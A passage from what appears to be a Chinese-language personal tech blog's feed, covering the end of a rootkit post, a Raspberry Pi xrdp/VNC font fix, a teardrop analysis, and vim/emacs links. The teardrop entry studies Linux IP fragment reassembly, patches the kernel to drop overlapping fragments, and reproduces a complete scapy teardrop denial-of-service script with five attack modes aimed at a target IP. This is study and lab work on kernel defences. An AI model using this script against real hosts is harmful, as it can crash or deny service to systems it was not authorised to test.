groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare),1000(r00t)</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
</ul>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>后续实验应该会参照谷大神的<a href="https://github.com/NoviceLive/research-rootkit">教程</a>继续学习，关于其防范策略目前还没有什么非常好用的方法，只能靠管理员多注意了。在后渗透测试阶段此隐蔽性非常强，特别是内核级的相对于应用级的更加难以发现，其中有一个应用级的用bash实现的可以<a href="https://github.com/cloudsec/brootkit">参考学习</a>。</p>
]]></content>
      <categories>
        <category>study</category>
        <category>misc</category>
      </categories>
      <tags>
        <tag>C/C++</tag>
        <tag>exploit</tag>
        <tag>r00tk1t</tag>
      </tags>
  </entry>
  <entry>
    <title>raspberry pi xrdp error</title>
    <url>/embpgp.github.io/2016/11/07/raspberry-pi-xrdp-error/</url>
    <content><![CDATA[<p>参考资料:<br><a href="http://askubuntu.com/questions/648819/couldnt-start-xtightvnc-trying-default-font-path-vncserver">http://askubuntu.com/questions/648819/couldnt-start-xtightvnc-trying-default-font-path-vncserver</a></p>
<blockquote>
<p>关于树莓派的介绍以及使用可参考官方网站  </p>
</blockquote>
<span id="more"></span>


<h1 id="单板Linux"><a href="#单板Linux" class="headerlink" title="单板Linux"></a>单板Linux</h1><p>随着嵌入式Linux越来越流行,目前很多厂商都在致力于做单板主机,因此市面上也有很多产品可供选择.其中最具有活力的便是树莓派了,连在<strong>Mr Robot</strong>一剧中都被主人公拿来”打广告”.其他诸如香蕉派,香橙派,菠萝派等等pi都有开发团队在开发和维护,有兴趣的可以逐个折腾或者吊的自己绘制PCB制作.</p>
<h1 id="访问方式"><a href="#访问方式" class="headerlink" title="访问方式"></a>访问方式</h1><p>毫无疑问Web是目前最流行的可视化途径,但是在Linux中最最适合的还是属于console.一般默认在刷入固件之后会默认开启sshd服务,此时便可以通过网络接口ssh连接工具访问树莓派.当然,如果没有开启或者没有通过扫描等方式获取到树莓派的IP地址,则可以借助显示设备或者默认的串口来查看信息,可供选择的是显示接口为HDMI和专用显示接口,一般我们会用HDMI转VGA转接口来接显示屏,此后配置好后便可以当小型服务器用了.</p>
<h1 id="配置远程桌面"><a href="#配置远程桌面" class="headerlink" title="配置远程桌面"></a>配置远程桌面</h1><p>有些时候console解决不了的时候就必须启用rdp了.Linux中可供选择的桌面系统还是很多的,其中xfce作为流行的轻量级的桌面系统深受好评.一般我们仅仅需要开启xrdp服务即可采用微软的<strong>mstsc</strong>工具来连接Linux主机,但xrdp貌似也是在本地封装vnc服务,因此当vnc服务出现问题的时候即便3389端口处于监听状态也是没辙.无奈只好谷歌.报错信息如下:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">osmc@osmc:~$ vncserver </span><br><span class="line">Couldn<span class="string">&#x27;t start Xtightvnc; trying default font path.</span></span><br><span class="line"><span class="string">Please set correct fontPath in the vncserver script.</span></span><br><span class="line"><span class="string">Couldn&#x27;</span>t start Xtightvnc process.</span><br><span class="line"></span><br><span class="line">07/11/16 01:04:29 Xvnc version TightVNC-1.3.9</span><br><span class="line">07/11/16 01:04:29 Copyright (C) 2000-2007 TightVNC Group</span><br><span class="line">07/11/16 01:04:29 Copyright (C) 1999 AT&amp;T Laboratories Cambridge</span><br><span class="line">07/11/16 01:04:29 All Rights Reserved.</span><br><span class="line">07/11/16 01:04:29 See http://www.tightvnc.com/ <span class="keyword">for</span> information on TightVNC</span><br><span class="line">07/11/16 01:04:29 Desktop name <span class="string">&#x27;X&#x27;</span> (osmc:1)</span><br><span class="line">07/11/16 01:04:29 Protocol versions supported: 3.3, 3.7, 3.8, 3.7t, 3.8t</span><br><span class="line">07/11/16 01:04:29 Listening <span class="keyword">for</span> VNC connections on TCP port 5901</span><br><span class="line">Font directory <span class="string">&#x27;/usr/share/fonts/X11/misc/&#x27;</span> not found - ignoring</span><br><span class="line">Font directory <span class="string">&#x27;/usr/share/fonts/X11/Type1/&#x27;</span> not found - ignoring</span><br><span class="line">Font directory <span class="string">&#x27;/usr/share/fonts/X11/75dpi/&#x27;</span> not found - ignoring</span><br><span class="line">Font directory <span class="string">&#x27;/usr/share/fonts/X11/100dpi/&#x27;</span> not found - ignoring</span><br><span class="line"></span><br><span class="line">Fatal server error:</span><br><span class="line">could not open default font <span class="string">&#x27;fixed&#x27;</span></span><br><span class="line">07/11/16 01:04:30 Xvnc version TightVNC-1.3.9</span><br><span class="line">07/11/16 01:04:30 Copyright (C) 2000-2007 TightVNC Group</span><br><span class="line">07/11/16 01:04:30 Copyright (C) 1999 AT&amp;T Laboratories Cambridge</span><br><span class="line">07/11/16 01:04:30 All Rights Reserved.</span><br><span class="line">07/11/16 01:04:30 See http://www.tightvnc.com/ <span class="keyword">for</span> information on TightVNC</span><br><span class="line">07/11/16 01:04:30 Desktop name <span class="string">&#x27;X&#x27;</span> (osmc:1)</span><br><span class="line">07/11/16 01:04:30 Protocol versions supported: 3.3, 3.7, 3.8, 3.7t, 3.8t</span><br><span class="line">07/11/16 01:04:30 Listening <span class="keyword">for</span> VNC connections on TCP port 5901</span><br><span class="line">Font directory <span class="string">&#x27;/usr/share/fonts/X11/misc/&#x27;</span> not found - ignoring</span><br><span class="line">Font directory <span class="string">&#x27;/usr/share/fonts/X11/Speedo/&#x27;</span> not found - ignoring</span><br><span class="line">Font directory <span class="string">&#x27;/usr/share/fonts/X11/Type1/&#x27;</span> not found - ignoring</span><br><span class="line">Font directory <span class="string">&#x27;/usr/share/fonts/X11/75dpi/&#x27;</span> not found - ignoring</span><br><span class="line">Font directory <span class="string">&#x27;/usr/share/fonts/X11/100dpi/&#x27;</span> not found - ignoring</span><br><span class="line"></span><br><span class="line">Fatal server error:</span><br><span class="line">could not open default font <span class="string">&#x27;fixed&#x27;</span></span><br></pre></td></tr></table></figure>
<p>找了好几个论坛之后又装了好多貌似多余的东西,最后发现仅仅需在<a href="http://askubuntu.com/questions/648819/couldnt-start-xtightvnc-trying-default-font-path-vncserver">这里</a>键入<code>sudo apt-get install  xfonts-base</code>即可解决字体问题了.   </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">osmc@osmc:~$ sudo vncserver </span><br><span class="line"></span><br><span class="line">New <span class="string">&#x27;X&#x27;</span> desktop is osmc:1</span><br><span class="line"></span><br><span class="line">Creating default startup script /root/.vnc/xstartup</span><br><span class="line">Starting applications specified <span class="keyword">in</span> /root/.vnc/xstartup</span><br><span class="line">Log file is /root/.vnc/osmc:1.log</span><br><span class="line"></span><br><span class="line">osmc@osmc:~$ netstat -anot</span><br><span class="line">Active Internet connections (servers and established)</span><br><span class="line">Proto Recv-Q Send-Q Local Address           Foreign Address         State       Timer</span><br><span class="line">tcp        0      0 0.0.0.0:5901            0.0.0.0:*               LISTEN      off (0.00/0/0)</span><br><span class="line">tcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN      off (0.00/0/0)</span><br><span class="line">tcp        0      0 0.0.0.0:8080            0.0.0.0:*               LISTEN      off (0.00/0/0)</span><br><span class="line">tcp        0      0 0.0.0.0:6001            0.0.0.0:*               LISTEN      off (0.00/0/0)</span><br><span class="line">tcp        0      0 127.0.0.1:3350          0.0.0.0:*               LISTEN      off (0.00/0/0)</span><br><span class="line">tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      off (0.00/0/0)</span><br><span class="line">tcp        0      0 0.0.0.0:1177            0.0.0.0:*               LISTEN      off (0.00/0/0)</span><br><span class="line">tcp        0      0 0.0.0.0:36666           0.0.0.0:*               LISTEN      off (0.00/0/0)</span><br><span class="line">tcp        0      0 0.0.0.0:3389            0.0.0.0:*               LISTEN      off (0.00/0/0)</span><br><span class="line">tcp        0    180 192.168.31.132:22       10.129.95.50:33532      ESTABLISHED on (0.21/0/0)</span><br><span class="line">tcp6       0      0 :::111                  :::*                    LISTEN      off (0.00/0/0)</span><br><span class="line">tcp6       0      0 :::8080                 :::*                    LISTEN      off (0.00/0/0)</span><br><span class="line">tcp6       0      0 :::22                   :::*                    LISTEN      off (0.00/0/0)</span><br><span class="line">tcp6       0      0 :::36666                :::*                    LISTEN      off (0.00/0/0)</span><br><span class="line">tcp6       0      0 :::36667                :::*                    LISTEN      off (0.00/0/0)</span><br><span class="line">tcp6       0      0 ::1:9090                :::*                    LISTEN      off (0.00/0/0)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>可以看到服务已经开启了,5901端口处于监听状态.再次<code>mstsc</code>之后发现error没了,问题解决.</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>遇到问题还是要有折腾的情怀,虽然还不知所以然,但是能够解决这个问题也不辜负<strong>搬砖</strong>的身份…为了不犯第二次错误,便记录下了本文.</p>
]]></content>
      <categories>
        <category>study</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Configure</tag>
      </tags>
  </entry>
  <entry>
    <title>teardrop分析</title>
    <url>/embpgp.github.io/2017/10/18/teardrop%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<blockquote>
<p>按照要求要丢弃掉这种数据包…</p>
</blockquote>
<span id="more"></span>

<hr>
<p>参考资料:<br><a href="http://blog.csdn.net/opens_tym/article/details/17737419">http://blog.csdn.net/opens_tym/article/details/17737419</a><br><a href="https://segmentfault.com/a/1190000008836467">https://segmentfault.com/a/1190000008836467</a><br><a href="http://zgykill.lofter.com/tag/Linux">http://zgykill.lofter.com/tag/Linux</a><br><a href="https://www.juniper.net/documentation/en_US/junos/topics/concept/denial-of-service-os-teardrop-attack-understanding.html">https://www.juniper.net/documentation/en_US/junos/topics/concept/denial-of-service-os-teardrop-attack-understanding.html</a><br><a href="http://www.nsfocus.net/index.php?act=magazine&do=view&mid=584">http://www.nsfocus.net/index.php?act=magazine&amp;do=view&amp;mid=584</a><br><a href="https://www.samsclass.info/123/proj10/teardrop.htm">https://www.samsclass.info/123/proj10/teardrop.htm</a><br><a href="https://yq.aliyun.com/articles/11345?spm=5176.100239.blogcont11018.9.W7XutP">https://yq.aliyun.com/articles/11345?spm=5176.100239.blogcont11018.9.W7XutP</a></p>
<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>teardrop主要是利用操作系统协议栈处理IP分片的时候,对于畸形数据包重叠其余分片来使得重组算法发生错误,轻则发生内存泄露重则造成宕机或者拒绝服务.可以参考绿盟分析Linux 2.0内核时期的漏洞原理.而从2.4开始内核就修复了这个漏洞,并尝试如果可能就尽量修复重叠的数据包.具体参见截取部分关键代码(net/ipv4/ip_fragment.c):</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* We found where to put this one.  Check for overlap with</span></span><br><span class="line"><span class="comment"> * preceding fragment, and, if needed, align things so that</span></span><br><span class="line"><span class="comment"> * any overlaps are eliminated.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (prev) &#123;</span><br><span class="line">	<span class="keyword">int</span> i = (FRAG_CB(prev)-&gt;offset + prev-&gt;len) - offset;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (i &gt; <span class="number">0</span>) &#123;</span><br><span class="line">		offset += i;</span><br><span class="line">		err = -EINVAL;</span><br><span class="line">		<span class="keyword">if</span> (end &lt;= offset)</span><br><span class="line">			<span class="keyword">goto</span> err;</span><br><span class="line">		err = -ENOMEM;</span><br><span class="line">		<span class="keyword">if</span> (!pskb_pull(skb, i))</span><br><span class="line">			<span class="keyword">goto</span> err;</span><br><span class="line">		<span class="keyword">if</span> (skb-&gt;ip_summed != CHECKSUM_UNNECESSARY)</span><br><span class="line">			skb-&gt;ip_summed = CHECKSUM_NONE;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">err = -ENOMEM;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (next &amp;&amp; FRAG_CB(next)-&gt;offset &lt; end) &#123;</span><br><span class="line">	<span class="keyword">int</span> i = end - FRAG_CB(next)-&gt;offset; <span class="comment">/* overlap is &#x27;i&#x27; bytes */</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (i &lt; next-&gt;len) &#123;</span><br><span class="line">		<span class="comment">/* Eat head of the next overlapped fragment</span></span><br><span class="line"><span class="comment">		 * and leave the loop. The next ones cannot overlap.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		<span class="keyword">if</span> (!pskb_pull(next, i))</span><br><span class="line">			<span class="keyword">goto</span> err;</span><br><span class="line">		FRAG_CB(next)-&gt;offset += i;</span><br><span class="line">		qp-&gt;q.meat -= i;</span><br><span class="line">		<span class="keyword">if</span> (next-&gt;ip_summed != CHECKSUM_UNNECESSARY)</span><br><span class="line">			next-&gt;ip_summed = CHECKSUM_NONE;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		struct sk_buff *free_it = next;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* Old fragment is completely overridden with</span></span><br><span class="line"><span class="comment">		 * new one drop it.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		next = next-&gt;next;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (prev)</span><br><span class="line">			prev-&gt;next = next;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			qp-&gt;q.fragments = next;</span><br><span class="line"></span><br><span class="line">		qp-&gt;q.meat -= free_it-&gt;len;</span><br><span class="line">		frag_kfree_skb(qp-&gt;q.net, free_it, <span class="literal">NULL</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>上述代码就是Linux内核用来尝试修复有重叠的分片,原则是如果跟前一个数据包有重叠,就丢弃掉本分片的重叠部分,而如果跟后面的所有数据包有重叠,就调整后面的分片包,释放或者调整其指针.因此这两处代码就是我们要做文章的地方.</p>
<h1 id="丢包"><a href="#丢包" class="headerlink" title="丢包"></a>丢包</h1><p>改过之后的代码如下:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/* We found <span class="built_in">where</span> to put this one.  Check <span class="keyword">for</span> overlap with</span><br><span class="line">	 * preceding fragment, and, <span class="keyword">if</span> needed, align things so that</span><br><span class="line">	 * any overlaps are eliminated.</span><br><span class="line">	 */</span><br><span class="line">	<span class="keyword">if</span> (prev) &#123;</span><br><span class="line">		int i = (FRAG_CB(prev)-&gt;offset + prev-&gt;len) - offset;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (i &gt; 0) &#123;</span><br><span class="line">			offset += i;</span><br><span class="line">			err = -EINVAL;</span><br><span class="line">			printk(<span class="string">&quot;############ overlap before package ****\n&quot;</span>);</span><br><span class="line">			ipq_kill(qp); //标记失效</span><br><span class="line">			goto err;</span><br><span class="line">			<span class="keyword">if</span> (end &lt;= offset)</span><br><span class="line">				goto err;</span><br><span class="line">			err = -ENOMEM;</span><br><span class="line">			<span class="keyword">if</span> (!pskb_pull(skb, i))</span><br><span class="line">				goto err;</span><br><span class="line">			<span class="keyword">if</span> (skb-&gt;ip_summed != CHECKSUM_UNNECESSARY)</span><br><span class="line">				skb-&gt;ip_summed = CHECKSUM_NONE;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	err = -ENOMEM;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (next &amp;&amp; FRAG_CB(next)-&gt;offset &lt; end) &#123;</span><br><span class="line">		int i = end - FRAG_CB(next)-&gt;offset; /* overlap is <span class="string">&#x27;i&#x27;</span> bytes */</span><br><span class="line">		printk(<span class="string">&quot;overlap after package*****************\n&quot;</span>);</span><br><span class="line">		err=-EINVAL;</span><br><span class="line">		ipq_kill(qp);  //标记失效</span><br><span class="line">		goto err;</span><br><span class="line">		<span class="keyword">if</span> (i &lt; next-&gt;len) &#123;</span><br><span class="line">			/* Eat head of the next overlapped fragment</span><br><span class="line">			 * and leave the loop. The next ones cannot overlap.</span><br><span class="line">			 */</span><br><span class="line">			<span class="keyword">if</span> (!pskb_pull(next, i))</span><br><span class="line">				goto err;</span><br><span class="line">			FRAG_CB(next)-&gt;offset += i;</span><br><span class="line">			qp-&gt;q.meat -= i;</span><br><span class="line">			<span class="keyword">if</span> (next-&gt;ip_summed != CHECKSUM_UNNECESSARY)</span><br><span class="line">				next-&gt;ip_summed = CHECKSUM_NONE;</span><br><span class="line">			<span class="built_in">break</span>;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			struct sk_buff *free_it = next;</span><br><span class="line"></span><br><span class="line">			/* Old fragment is completely overridden with</span><br><span class="line">			 * new one drop it.</span><br><span class="line">			 */</span><br><span class="line">			next = next-&gt;next;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (prev)</span><br><span class="line">				prev-&gt;next = next;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				qp-&gt;q.fragments = next;</span><br><span class="line"></span><br><span class="line">			qp-&gt;q.meat -= free_it-&gt;len;</span><br><span class="line">			frag_kfree_skb(qp-&gt;q.net, free_it, NULL);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>我们发现有重叠就把这个链表全部丢掉,为什么调用ipq_kill函数就行了呢?</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Kill ipq entry. It is not destroyed immediately,</span></span><br><span class="line"><span class="comment"> * because caller (and someone more) holds reference count.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">ipq_kill</span><span class="params">(struct ipq *ipq)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	inet_frag_kill(&amp;ipq-&gt;q, &amp;ip4_frags);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>看内核代码注释就知道,然后跟进去.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">inet_frag_kill</span><span class="params">(struct inet_frag_queue *fq, struct inet_frags *f)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (del_timer(&amp;fq-&gt;timer))</span><br><span class="line">		atomic_dec(&amp;fq-&gt;refcnt);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!(fq-&gt;last_in &amp; INET_FRAG_COMPLETE)) &#123;</span><br><span class="line">		fq_unlink(fq, f);</span><br><span class="line">		atomic_dec(&amp;fq-&gt;refcnt);</span><br><span class="line">		fq-&gt;last_in |= INET_FRAG_COMPLETE;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>发现只是删除了定时器并减少了引用计数.如果检测到包分片没有收完,则将fq从哈希链表中和lru链表中移除.并减少引用计数.置收完标志位.而虽然这个函数没有直接销毁这个队列链表,但是当ip_frag_queue返回的时候,再次调用ipq_put-&gt;inet_frag_put就知道了,原子性减1并测试是否为0,如果是,则直接调用inet_frag_destroy销毁整个分片队列并回收资源.在这里需要跟一下引用计数,看什么时候才为0,并且一开始被创建的时候是为1的,而每次定时器操作以及分片操作的时候会增加1,操作完之后又会put而减1.</p>
<h1 id="攻击代码"><a href="#攻击代码" class="headerlink" title="攻击代码"></a>攻击代码</h1><p>从网络上down了一份如下:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">total = <span class="built_in">len</span>(sys.argv)</span><br><span class="line"><span class="keyword">if</span> total != <span class="number">3</span>:</span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;Performs teardrop attack from Kali Linux&quot;</span></span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot; &quot;</span></span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;Usage: ./tear TARGET-IP ATTACK-CODE&quot;</span></span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;   Attack Codes:&quot;</span></span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;   0: small payload (36 bytes), 2 packets, offset=3x8 bytes&quot;</span></span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;   1: large payload (1300 bytes), 2 packets, offset=80x8 bytes&quot;</span></span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;   2: large payload (1300 bytes), 12 packets, offset=80x8 bytes&quot;</span></span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;   3: large payload (1300 bytes), 2 packets, offset=3x8 bytes&quot;</span></span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;   4: large payload (1300 bytes), 2 packets, offset=10x8 bytes&quot;</span></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">target=<span class="built_in">str</span>(sys.argv[<span class="number">1</span>])</span><br><span class="line">attack=sys.argv[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;Attacking target &#x27;</span> + target + <span class="string">&#x27; with attack &#x27;</span> + attack</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> attack == <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;Using attack 0&quot;</span></span><br><span class="line">  size=<span class="number">36</span></span><br><span class="line">  offset=<span class="number">3</span></span><br><span class="line">  load1=<span class="string">&quot;\x00&quot;</span>*size</span><br><span class="line">  </span><br><span class="line">  i=IP()</span><br><span class="line">  i.dst=target</span><br><span class="line">  i.flags=<span class="string">&quot;MF&quot;</span></span><br><span class="line">  i.proto=<span class="number">17</span></span><br><span class="line">  </span><br><span class="line">  size=<span class="number">4</span></span><br><span class="line">  offset=<span class="number">18</span></span><br><span class="line">  load2=<span class="string">&quot;\x00&quot;</span>*size</span><br><span class="line"></span><br><span class="line">  j=IP()</span><br><span class="line">  j.dst=target</span><br><span class="line">  j.flags=<span class="number">0</span></span><br><span class="line">  j.proto=<span class="number">17</span></span><br><span class="line">  j.frag=offset</span><br><span class="line">  </span><br><span class="line">  send(i/load1)</span><br><span class="line">  send(j/load2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> attack == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;Using attack 1&quot;</span></span><br><span class="line">  size=<span class="number">1300</span></span><br><span class="line">  offset=<span class="number">80</span></span><br><span class="line">  load=<span class="string">&quot;A&quot;</span>*size</span><br><span class="line">  </span><br><span class="line">  i=IP()</span><br><span class="line">  i.dst=target</span><br><span class="line">  i.flags=<span class="string">&quot;MF&quot;</span></span><br><span class="line">  i.proto=<span class="number">17</span></span><br><span class="line">  </span><br><span class="line">  j=IP()</span><br><span class="line">  j.dst=target</span><br><span class="line">  j.flags=<span class="number">0</span> </span><br><span class="line">  j.proto=<span class="number">17</span></span><br><span class="line">  j.frag=offset</span><br><span class="line">  </span><br><span class="line">  send(i/load)</span><br><span class="line">  send(j/load)</span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> attack == <span class="string">&#x27;2&#x27;</span>:</span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;Using attack 2&quot;</span></span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;Attacking with attack 2&quot;</span></span><br><span class="line">  size=<span class="number">1300</span></span><br><span class="line">  offset=<span class="number">80</span></span><br><span class="line">  load=<span class="string">&quot;A&quot;</span>*size</span><br><span class="line">  </span><br><span class="line">  i=IP()</span><br><span class="line">  i.dst=target</span><br><span class="line">  i.proto=<span class="number">17</span></span><br><span class="line">  i.flags=<span class="string">&quot;MF&quot;</span></span><br><span class="line">  i.frag=<span class="number">0</span></span><br><span class="line">  send(i/load)</span><br><span class="line"></span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;Attack 2 packet 0&quot;</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10</span>):</span><br><span class="line">    i.frag=offset</span><br><span class="line">    offset=offset+<span class="number">80</span></span><br><span class="line">    send(i/load)</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;Attack 2 packet &quot;</span> + <span class="built_in">str</span>(x)</span><br><span class="line">  </span><br><span class="line">  i.frag=offset</span><br><span class="line">  i.flags=<span class="number">0</span></span><br><span class="line">  send(i/load)</span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> attack == <span class="string">&#x27;3&#x27;</span>:</span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;Using attack 3&quot;</span></span><br><span class="line">  size=<span class="number">1336</span></span><br><span class="line">  offset=<span class="number">3</span></span><br><span class="line">  load1=<span class="string">&quot;\x00&quot;</span>*size</span><br><span class="line">  </span><br><span class="line">  i=IP()</span><br><span class="line">  i.dst=target</span><br><span class="line">  i.flags=<span class="string">&quot;MF&quot;</span></span><br><span class="line">  i.proto=<span class="number">17</span></span><br><span class="line">  </span><br><span class="line">  size=<span class="number">4</span></span><br><span class="line">  offset=<span class="number">18</span></span><br><span class="line">  load2=<span class="string">&quot;\x00&quot;</span>*size</span><br><span class="line">  </span><br><span class="line">  j=IP()</span><br><span class="line">  j.dst=target</span><br><span class="line">  j.flags=<span class="number">0</span></span><br><span class="line">  j.proto=<span class="number">17</span></span><br><span class="line">  j.frag=offset</span><br><span class="line">  </span><br><span class="line">  send(i/load1)</span><br><span class="line">  send(j/load2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:         <span class="comment"># attack == 4</span></span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;Using attack 4&quot;</span></span><br><span class="line">  size=<span class="number">1300</span></span><br><span class="line">  offset=<span class="number">10</span></span><br><span class="line">  load=<span class="string">&quot;A&quot;</span>*size</span><br><span class="line">  </span><br><span class="line">  i=IP()</span><br><span class="line">  i.dst=target</span><br><span class="line">  i.flags=<span class="string">&quot;MF&quot;</span></span><br><span class="line">  i.proto=<span class="number">17</span></span><br><span class="line">  </span><br><span class="line">  j=IP()</span><br><span class="line">  j.dst=target</span><br><span class="line">  j.flags=<span class="number">0</span></span><br><span class="line">  j.proto=<span class="number">17</span></span><br><span class="line">  j.frag=offset</span><br><span class="line">  </span><br><span class="line">  send(i/load)</span><br><span class="line">  send(j/load)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;Done!&quot;</span></span><br></pre></td></tr></table></figure>
<p>要运行这份代码首先要用py安装scapy库,代码为了简单几乎连exit不想写了,因此直接运行记得要加参数.数据包填充也很简单,就是一直重叠分片,如果在Windows上用wireshark抓包则组包成一个之后会显示坏的包.</p>
<h1 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h1><p>在测试机器上运行shell命令,监控printk打印.<br><code>[root@localhost linux-2.6.32.27]# while :;do dmesg -c 5; sleep 1; done</code><br>我还是用的是上次测试Linux内存段页式转换那一台Centos6.9,从kernel.org下载一份2.6内核的代码重新编译.直接<code>make localmodconfig</code>,一路回车,之后<code>make -j8 &amp;&amp; make modules_install &amp;&amp; make install &amp;&amp; reboot</code>即可.测试结果如下:<br><img src="/images/teardrop_attack_tcpdump.png" alt="teardrop_attack_tcpdump.png"><br><img src="/images/teardrop_attack_printk.png" alt="teardrop_attack_printk.png"><br>我是将命令码从4.3.2.1.0执行了一遍,可以分析得出基本是每两个包就造成一次释放分片链表,而截断长度为显示为0的分片包重组的时候没有报重叠,有一个覆盖后面的有可能是由于分片包到的顺序不一致,因而攻击代码2是最明显的,如果要打出具体的攻击IP则应该利用skb结构体来打更多信息.</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>主要研究学习了下内核中IP分片包重组算法以及引用计数如何到0来使得整个分片链表被释放的.</p>
]]></content>
      <categories>
        <category>study</category>
      </categories>
      <tags>
        <tag>Linux kernel</tag>
        <tag>network security</tag>
      </tags>
  </entry>
  <entry>
    <title>vim_and_emacs</title>
    <url>/embpgp.github.io/2016/08/23/vim-and-emacs/</url>
    <content><![CDATA[<blockquote>
<p>在学习Linux的时候，最好从console开始，完全脱离窗体束缚，感受最原始的类DOS时代的<code>程序员使命感</code>,由于Linux下编辑器也是五花八门，不过最流行的莫过于Vim和Emacs，在这里附上它们的一些链接便于学习．</p>
</blockquote>
<span id="more"></span>

<p>参考资料：<br><a href="http://vimdoc.sourceforge.net/" title="Vimdoc">Vimdoc:http://vimdoc.sourceforge.net/</a><br><a href="http://vimdoc.sourceforge.net/vimum.html">Vimnum:http://vimdoc.sourceforge.net/vimum.html</a><br><a href="http://www.caole.net/diary/vim.html#sec-14">caole_Vim:http://www.caole.net/diary/vim.html#sec-14</a><br><a href="http://dsec.pku.edu.cn/~jinlong/vi/Vi.html">caole_Vim_improved:http://dsec.pku.edu.cn/~jinlong/vi/Vi.html</a><br><a href="http://www.caole.net/diary/emacs_tips.html">caole_Emacs:http://www.caole.net/diary/emacs_tips.html</a><br><a href="https://github.com/yangyangwithgnu/use_vim_as_ide">https://github.com/yangyangwithgnu/use_vim_as_ide</a></p>
]]></content>
      <categories>
        <category>study</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>一起来撸printf吧</title>
    <url>/embpgp.github.io/2016/09/25/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%92%B8printf%E5%90%A7/</url>
    <content><![CDATA[<blockquote>
